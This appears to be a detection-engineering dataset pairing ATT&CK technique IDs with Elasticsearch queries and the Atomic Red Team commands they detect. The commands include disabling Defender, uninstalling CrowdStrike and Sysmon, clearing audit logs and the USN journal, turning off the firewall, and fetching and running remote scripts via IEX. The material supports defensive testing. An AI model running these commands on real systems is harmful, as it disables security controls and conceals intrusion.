T1497.003,"{
    ""query"": {
        ""bool"": {
            ""should"": [
                {""match"": {""CommandLine"": ""sleep""}},
                {""match_phrase"": {""CommandLine"": ""sleep.exe""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",sleep 60,2(4)
T1562.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""wildcard"": {""CommandLine"": ""AdvancedRun*""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""wildcard"": {""CommandLine"": ""sc*""}},
                        {""wildcard"": {""CommandLine"": ""powershell*""}}
      ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match_phrase"": {""CommandLine"": ""stop WinDefend""}},
                        {""match_phrase"": {""CommandLine"": {
                                                              ""query"":""rmdir Windows Defender"",
                                                              ""slop"":4}}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","Try {cmd /c $env:temp\AdvancedRun.exe /EXEFilename ""$env:systemroot\System32\sc.exe"" /WindowState 0 /CommandLine ""stop WinDefend"" /StartDirectory """" /RunAs 8 /Run} Catch{}; 
if(0){;
   $CommandToRun = rmdir ""$env:programdata\Microsoft\Windows Defender"" -Recurse;
   Try {cmd /c $env:temp\AdvancedRun.exe /EXEFilename ""$env:systemroot\System32\WindowsPowershell\v1.0\powershell.exe"" /WindowState 0 /CommandLine ""$CommandToRun"" /StartDirectory """" /RunAs 8 /Run} Catch{};
 }",2
T1562.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""wildcard"": {""CommandLine"": ""DefenderControl*""}},
                {""match_phrase"": {""CommandLine"": ""/D FFFF""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",cmd /c $env:temp\DefenderControl\DefenderControl\DefenderControl.exe /D FFFF | Out-Null,2
T1562.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match_phrase"": {""CommandLine"": ""Software\\Microsoft\\Office*""}},
                        {""match_phrase"": {""CommandLine"": ""New-ItemProperty""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""wildcard"": {""CommandLine"": ""VBAWarnings*""}},
                        {""wildcard"": {""CommandLine"": ""DisableInternetFilesInPV*""}},
                        {""wildcard"": {""CommandLine"": ""DisableAttachementsInPV*""}},
                        {""wildcard"": {""CommandLine"": ""DisableUnsafeLocationsInPV*""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","New-Item -Path ""HKCU:\Software\Microsoft\Office\16.0\Excel""; 
New-Item -Path ""HKCU:\Software\Microsoft\Office\16.0\Excel\Security""; 
New-Item -Path ""HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView""; 
New-ItemProperty -Path ""HKCU:\Software\Microsoft\Office\16.0\Excel\Security"" -Name ""VBAWarnings"" -Value ""1"" -PropertyType ""Dword""; 
New-ItemProperty -Path ""HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView"" -Name ""DisableInternetFilesInPV"" -Value ""1"" -PropertyType ""Dword""; 
New-ItemProperty -Path ""HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView"" -Name ""DisableUnsafeLocationsInPV"" -Value ""1"" -PropertyType ""Dword""; 
New-ItemProperty -Path ""HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView"" -Name ""DisableAttachementsInPV"" -Value ""1"" -PropertyType ""Dword""",(2)4
T1562.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match_phrase"": {""CommandLine"": ""Set-MpPreference""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match"": {""CommandLine"": ""-DisableIntrusionPreventionSystem""}},
                        {""match"": {""CommandLine"": ""-DisableIOAVProtection""}},
                        {""match"": {""CommandLine"": ""-DisableRealtimeMonitoring""}},
                        {""match_phrase"": {""CommandLine"": ""-EnableControlledFolderAccess Disabled""}},
                        {""match"": {""CommandLine"": ""-DisableScriptScanning""}},
                        {""match"": {""CommandLine"": ""-DisableBehaviorMonitoring""}},
                        {""match"": {""CommandLine"": ""-DisableBlockAtFirstSeen""}}
      ]
     }
    },
    {""bool"":{
          ""must_not"":[
                {""match"": {""CommandLine"": ""WinDefend""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","Set-MpPreference -DisableIntrusionPreventionSystem $true;
Set-MpPreference -DisableIOAVProtection $true;
Set-MpPreference -DisableRealtimeMonitoring $true;
Set-MpPreference -DisableScriptScanning $true;
Set-MpPreference -EnableControlledFolderAccess Disabled;
Set-MpPreference -DisableBehaviorMonitoring 1; 
Set-MpPreference -DisableBlockAtFirstSeen 1",2(4)
T1562.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match_phrase"": {""CommandLine"": ""Stop-Service""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match"": {""CommandLine"": ""WinDefend""}},
                        {""match"": {""CommandLine"": ""McAfeeDLPAgentService""}}
      ]
     }
    },
     {""bool"":{
     ""must_not"":[
                {""match"": {""CommandLine"": ""Set-MPPreference""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","$service = Get-Service WinDefend -ErrorAction SilentlyContinue;
  if ($service) {
    if ($service.Status -eq ""Running"") {
      Stop-Service WinDefend;
    }
  } else {
    echo ""Windows Defender service not found."";
    exit 1;
  };
};

Stop-Service -Name McAfeeDLPAgentService; 
Remove-Service -Name McAfeeDLPAgentService",2(4)
T1562.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""New-ItemProperty""}},
                {""match_phrase"": {""CommandLine"": ""Policies\\Microsoft\\Windows Defender""}},
                {""match"": {""CommandLine"": ""TamperData""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","New-Item -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Feature'; 
New-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Feature' -name 'TamperData' -value 0",2(4)
T1562.001,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                   {""wildcard"": {""CommandLine"": ""dism*""}},
                   {""match_phrase"": {""CommandLine"": ""/Disable-Feature""}},
                   {""wildcard"": {""CommandLine"": ""*Defender""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match_phrase"": {""CommandLine"": ""/Remove""}},
                        {""match_phrase"": {""CommandLine"": ""/NoRestart""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet,2
T1562.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""wildcard"": {""CommandLine"": ""MpCmdRun*""}},
                {""match"": {""CommandLine"": ""-RemoveDefinitions""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","""C:\Program Files\Windows Defender\MpCmdRun.exe"" -RemoveDefinitions -All",2(4)
T1562.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""Set-ItemProperty""}},
                {""match_phrase"": {""CommandLine"": ""Policies\\Microsoft\\Windows\\PowerShell""}},
                {""wildcard"": {""CommandLine"": ""*ExecutionPolicy""}},
                {""wildcard"": {""CommandLine"": ""Bypass*""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","Set-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\PowerShell -Name ExecutionPolicy -Value ByPass;
        $shell = New-Object -ComObject Wscript.Shell
        Set-ExecutionPolicy Bypass | echo $shell.sendkeys(""Y`r`n"")",2
T1562.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""Set-ItemProperty""}},
                {""match_phrase"": {""CommandLine"": ""Policies\\Microsoft\\Windows Defender""}},
                {""match"": {""CommandLine"": ""DisableAntiSpyware""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","Set-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"" -Name DisableAntiSpyware -Value 1",2(4)
T1562.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""wildcard"": {""CommandLine"": ""CrowdStrike*""}},
                {""match"": {""CommandLine"": ""/uninstall""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","if (Test-Path ""C:\ProgramData\Package Cache\{7489ba93-b668-447f-8401-7e57a6fe538d}\WindowsSensor.exe"") {. ""C:\ProgramData\Package Cache\{7489ba93-b668-447f-8401-7e57a6fe538d}\WindowsSensor.exe"" /repair /uninstall /quiet } else { Get-ChildItem -Path ""C:\ProgramData\Package Cache"" -Include ""WindowsSensor.exe"" -Recurse | % { $sig=$(Get-AuthenticodeSignature -FilePath $_.FullName); 
if ($sig.Status -eq ""Valid"" -and $sig.SignerCertificate.DnsNameList -eq ""CrowdStrike, Inc."") { . ""$_"" /repair /uninstall /quiet; 
break;
}}}",2(4)
T1562.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""wildcard"": {""CommandLine"": ""sysmon*""}},
                {""match"": {""CommandLine"": ""-u""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",sysmon -u,2
T1562.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""wildcard"": {""CommandLine"": ""fltmc*""}},
                {""match"": {""CommandLine"": ""unload""}},
                {""match"": {""CommandLine"": ""SysmonDrv""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",fltmc.exe unload SysmonDrv,2
T1562.002,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""wildcard"": {""CommandLine"": ""auditpol*""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match_phrase"": {""CommandLine"": ""/clear""}},
                        {""match_phrase"": {""CommandLine"": ""/remove""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","auditpol /clear /y 
&& auditpol /remove /allusers",2
T1562.002,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""wildcard"": {""CommandLine"": ""wevtutil*""}},
                {""match"": {""CommandLine"": ""sl""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","wevtutil sl ""Microsoft-Windows-IKE/Operational"" /e:false",(2)4
T1562.004,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""reg add""}},
                {""match_phrase"": {""CommandLine"": ""SharedAccess\\Parameters\\FirewallPolicy\\PublicProfile""}},
                {""match"": {""CommandLine"": ""EnableFirewall""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\PublicProfile"" /v ""EnableFirewall"" /t REG_DWORD /d 0 /f",2
T1027.004,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""Invoke-Expression""}},
                {""wildcard"": {""CommandLine"": ""*compile.exe""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",Invoke-Expression 893687_T1027.004_DynamicCompile.exe,2
T1027,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""wildcard"": {""CommandLine"": ""System.Text.Encoding*""}},
                        {""wildcard"": {""CommandLine"": ""*.GetBytes""}},
                        {""wildcard"": {""CommandLine"": ""*ToBase64String""}},
                        {""match_phrase"": {""CommandLine"": ""powershell.exe""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""wildcard"": {""CommandLine"": ""-EncodedCommand*""}},
                        {""match_phrase"": {""CommandLine"": ""Set-ItemProperty""}},
                        {""match_phrase"": {""CommandLine"": ""Microsoft\\Windows\\CurrentVersion""}},
                        {""wildcard"": {""CommandLine"": ""*FromBase64String""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","$OriginalCommand = 'Write-Host ""Hey, Atomic!""'; 
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand); 
$EncodedCommand =[Convert]::ToBase64String($Bytes); 
$EncodedCommand; 
powershell.exe -EncodedCommand $EncodedCommand

$OriginalCommand = 'Write-Host ""Hey, Atomic!""'; 
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand); 
$EncodedCommand =[Convert]::ToBase64String($Bytes); 
$EncodedCommand; 
Set-ItemProperty -Force -Path HKCU:Software\Microsoft\Windows\CurrentVersion -Name Debug -Value $EncodedCommand; 
powershell.exe -Command ""IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:Software\Microsoft\Windows\CurrentVersion Debug).Debug)))""",2
T1027,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"":{
                                                       ""query"": "".zip\\ .exe"",
                                                       ""slop"":2}
                                            }}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","cmd.exe ""%temp%\temp_T1027.zip\T1027.exe""",2(1)
T1218.011,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""wildcard"": {""CommandLine"": ""rundll32*""}},
                        {""wildcard"": {""CommandLine"": ""*.dll""}}
      ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""wildcard"": {""CommandLine"": ""*.hta""}},
                        {""wildcard"": {""CommandLine"": ""*.vbs""}},
                        {""wildcard"": {""CommandLine"": ""*.inf""}},
                        {""wildcard"": {""CommandLine"": ""*.exe""}},
                        {""wildcard"": {""CommandLine"": ""*.sct""}},
                        {""match_phrase"": {""CommandLine"": ""WScript.Shell""}}
      ]
     }
    } ,
     {""bool"":{
     ""must_not"":[
                        {""wildcard"": {""CommandLine"": ""wmic*""}},
                         {""match"": {""CommandLine"": ""VBoxDRV""}},
                        {""match_phrase"": {""CommandLine"": ""users\\public\\""}},
                         {""match_phrase"": {""CommandLine"": ""windows\\System32""}},
                          {""match_phrase"": {""CommandLine"": ""SOFTWARE\\Classes\\CLSID""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","rundll32.exe url.dll,OpenURL 631d9f_index.hta 
&& rundll32.exe URL.dll,FileProtocolHandler PathToAtomicsFolder\T1218.011\src\akteullen.vbs

rundll32.exe pcwutl.dll,LaunchApplication %windir%\System32\notepad.exe

rundll32.exe advpack.dll,LaunchINFSection 80d0e0_T1218.011.inf,DefaultInstall_SingleUser,1,

rundll32.exe ieadvpack.dll,LaunchINFSection 80d0e0_T1218.011.inf,DefaultInstall_SingleUser,1,

rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 .\4c870d_T1218.011_DefaultInstall.inf

rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 .\4c870d_T1218.011_DefaultInstall.inf

rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";
document.write();
GetObject(""script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct"").Exec();

rundll32 vbscript:""\..\mshtml,RunHTMLApplication ""+String(CreateObject(""WScript.Shell"").Run(""calc.exe""),0)

rundll32.exe shell32.dll,Control_RunDLL 6349c0_calc.dll

rundll32.exe be0315_AllTheThingsx64.dll,#2",2
T1564,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                    {""match_phrase"": {""CommandLine"": ""-replace \""*\""\, \""*\""""}},
                    {""match_phrase"":{""CommandLine"": ""Invoke-Maldoc -macroCode""}},
                    {""wildcard"": {""CommandLine"": ""Extract*""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","$macro = [System.IO.File]::ReadAllText(""PathToAtomicsFolder\T1564\src\T1564-macrocode.txt""); 
$macro = $macro -replace ""aREPLACEMEa"", ""PathToAtomicsFolder\T1564\bin\extractme.bin""; 
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; 
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing); 
Invoke-Maldoc -macroCode ""$macro"" -officeProduct ""Word"" -sub ""Extract"" -NoWrap",2
T1036.003,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""bool"":{
     ""should"":[
                        {""wildcard"": {""TargetFilename"": ""*.docx.*""}},
                        {""wildcard"": {""TargetFilename"": ""*.pdf.*""}},
                        {""wildcard"": {""TargetFilename"": ""*.ps1.*""}},
                        {""wildcard"": {""TargetFilename"": ""*.xls.*""}},
                        {""wildcard"": {""TargetFilename"": ""*.xlsx.*""}},
                        {""wildcard"": {""TargetFilename"": ""*.png.*""}},
                        {""wildcard"": {""TargetFilename"": ""*.doc.*""}},
                        {""wildcard"": {""TargetFilename"": ""*.rtf.*""}},
                        {""match_phrase"": {""TargetFilename"": ""lsm.exe""}},
                        {""match_phrase"": {""TargetFilename"": ""notepad.exe""}},
                        {""match_phrase"": {""TargetFilename"": ""taskhostw.exe""}},
                        {""match_phrase"": {""TargetFilename"": ""svchost.exe""}},
                        {""match_phrase"": {""TargetFilename"": ""lsass.exe""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match_phrase"": {""Image"": ""system32\\cmd.exe""}},
                        {""match_phrase"": {""Image"": ""system32\\WindowsPowerShell\\v1.0\\powershell.exe""}}
      ]
     }
    },
    {""bool"":{
     ""must"":[
                        {""term"": {""EventID"": ""11""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","copy C:\Windows\System32\calc.exe %temp%\T1036.003_masquerading.docx.exe /Y 
&& copy C:\Windows\System32\calc.exe %temp%\T1036.003_masquerading.pdf.exe /Y 
&& copy C:\Windows\System32\calc.exe %temp%\T1036.003_masquerading.ps1.exe /Y 
&& copy 4bd145_T1036.003_masquerading.vbs %temp%\T1036.003_masquerading.xls.vbs /Y 
&& copy 4bd145_T1036.003_masquerading.vbs %temp%\T1036.003_masquerading.xlsx.vbs /Y 
&& copy 4bd145_T1036.003_masquerading.vbs %temp%\T1036.003_masquerading.png.vbs /Y 
&& copy 107417_T1036.003_masquerading.ps1 %temp%\T1036.003_masquerading.doc.ps1 /Y 
&& copy 107417_T1036.003_masquerading.ps1 %temp%\T1036.003_masquerading.pdf.ps1 /Y 
&& copy 107417_T1036.003_masquerading.ps1 %temp%\T1036.003_masquerading.rtf.ps1 /Y 
&& %temp%\T1036.003_masquerading.docx.exe 
&& %temp%\T1036.003_masquerading.pdf.exe 
&& %temp%\T1036.003_masquerading.ps1.exe 
&& %temp%\T1036.003_masquerading.xls.vbs 
&& %temp%\T1036.003_masquerading.xlsx.vbs 
&& %temp%\T1036.003_masquerading.png.vbs 
&& C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.003_masquerading.doc.ps1 
&& C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.003_masquerading.pdf.ps1 
&& C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.003_masquerading.rtf.ps1

copy C:\Windows\System32\cmd.exe C:\lsm.exe 
&& C:\lsm.exe /c echo T1036.003 > C:\T1036.003.txt

copy %SystemRoot%\System32\cscript.exe %APPDATA%\notepad.exe /Y 
&& cmd.exe /c %APPDATA%\notepad.exe /B

copy %windir%\System32\windowspowershell\v1.0\powershell.exe %APPDATA%\taskhostw.exe /Y 
&& cmd.exe /K %APPDATA%\taskhostw.exe

copy %SystemRoot%\System32\wscript.exe %APPDATA%\svchost.exe /Y 
&& cmd.exe /c %APPDATA%\svchost.exe /B

copy %SystemRoot%\System32\cmd.exe %SystemRoot%\Temp\lsass.exe 
&& %SystemRoot%\Temp\lsass.exe /B

copy 1db90b_T1036.003.exe ($env:TEMP + ""\svchost.exe""); 
$myT1036_003 = (Start-Process -PassThru -FilePath ($env:TEMP + ""\svchost.exe"")).Id; 
Stop-Process -ID $myT1036_003

copy $env:ComSpec ($env:TEMP + ""\svchost.exe""); 
$myT1036_003 = (Start-Process -PassThru -FilePath ($env:TEMP + ""\svchost.exe"")).Id; 
Stop-Process -ID $myT1036_003",2
T1222.001,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must_not"":[
                        {""match_phrase"": {""CommandLine"": ""System32\\sethc.exe""}}
                       
                    ]
     }
    },
    {""bool"":{
     ""must"":[
                {""wildcard"": {""CommandLine"": ""icacls*""}},
                {""match"": {""CommandLine"": ""/grant""}},
                {""wildcard"": {""CommandLine"": ""*:F""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","icacls ""C:\Users\Public\*"" /grant Everyone:F /T /C /Q

icacls.exe #{file_or_folder} /grant #{user_or_group}:F",2
T1222.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""wildcard"": {""CommandLine"": ""attrib*""}},
                {""match"": {""CommandLine"": ""-r""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",attrib.exe -r %temp%\T1222.001_attrib\*.* /s,2
T1222.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""wildcard"": {""CommandLine"": ""takeown*""}},
                 {""match"": {""CommandLine"": ""/r""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",takeown.exe /f %temp%\T1222.001_takeown_folder /r,2
T1564.003,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": "" powershell.exe""}},
                  {""match_phrase"": {""CommandLine"": ""calc.exe""}},
                   {""match_phrase"": {""CommandLine"": ""hidden""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",Start-Process powershell.exe -WindowStyle hidden calc.exe,2(4)
T1564.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                 {""bool"":{
                    ""should"":[
                        {""match_phrase"": {""CommandLine"": ""reg add""}},
                       
                        ]
                    }
                },
                {""bool"":{
                    ""must"":[
                        {""match_phrase"": {""CommandLine"": ""Windows\\CurrentVersion\\Explorer\Advanced""}}
                        ]
                    }
                },
                {""bool"":{
                    ""should"":[
                        {""match"": {""CommandLine"": ""ShowSuperHidden""}},
                        {""match"":{""CommandLine"": ""Hidden""}}
                        ]
                    }
                }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v ShowSuperHidden /t REG_DWORD /d 0 /f 
&& reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v Hidden /t REG_DWORD /d 0 /f",2
T1562.002,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""wildcard"": {""CommandLine"": ""auditpol*""}},
                        {""match_phrase"": {""CommandLine"": ""/set /category""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match_phrase"": {""CommandLine"": ""Account Logon""}},
                        {""match_phrase"": {""CommandLine"": ""Logon/Logoff""}},
                        {""match_phrase"": {""CommandLine"": ""Detailed Tracking""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","auditpol /set /category:""Account Logon"" /success:disable /failure:disable 
&& auditpol /set /category:""Logon/Logoff"" /success:disable /failure:disable 
&& auditpol /set /category:""Detailed Tracking"" /success:disable",2
T1070,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""wildcard"": {""CommandLine"": ""fsutil*""}},
                {""match"": {""CommandLine"": ""usn""}},
                {""match"": {""CommandLine"": ""deletejournal""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",fsutil usn deletejournal /D C:,2
T1202,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""wildcard"": {""CommandLine"": ""conhost*""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","conhost.exe ""notepad.exe""",2
T1202,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""wildcard"": {""CommandLine"": ""forfiles*""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match"": {""CommandLine"": ""/p""}},
                        {""match"": {""CommandLine"": ""/m""}},
                        {""match"": {""CommandLine"": ""/c""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe,2
T1202,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""wildcard"": {""CommandLine"": ""pcalua*""}},
                {""match"": {""CommandLine"": ""-a""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","pcalua.exe -a #{process} 
&& pcalua.exe -a #{payload_path}",2
T1218,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""wildcard"": {""CommandLine"": ""InfDefaultInstall*""}},
                {""wildcard"": {""CommandLine"": ""*.inf""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",InfDefaultInstall.exe 67d07e_Infdefaultinstall.inf,2(5)
T1218,"{
    ""query"": {
        ""bool"": {
            ""should"": [
                {""wildcard"": {""CommandLine"": ""Register-CimProvider*""}},
                {""match_phrase"": {""CommandLine"": ""SyncAppvPublishingServer.exe""}},
                {""wildcard"": {""CommandLine"": ""*RemoteFXvGPUDisablement*""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","C:\Windows\SysWow64\Register-CimProvider.exe -Path #{dll_payload}

SyncAppvPublishingServer.exe ""n; Start-Process calc.exe""

$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; 
if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  
Invoke-ATHRemoteFXvGPUDisablementCommand -ModuleName foo -ModulePath $PWD",2
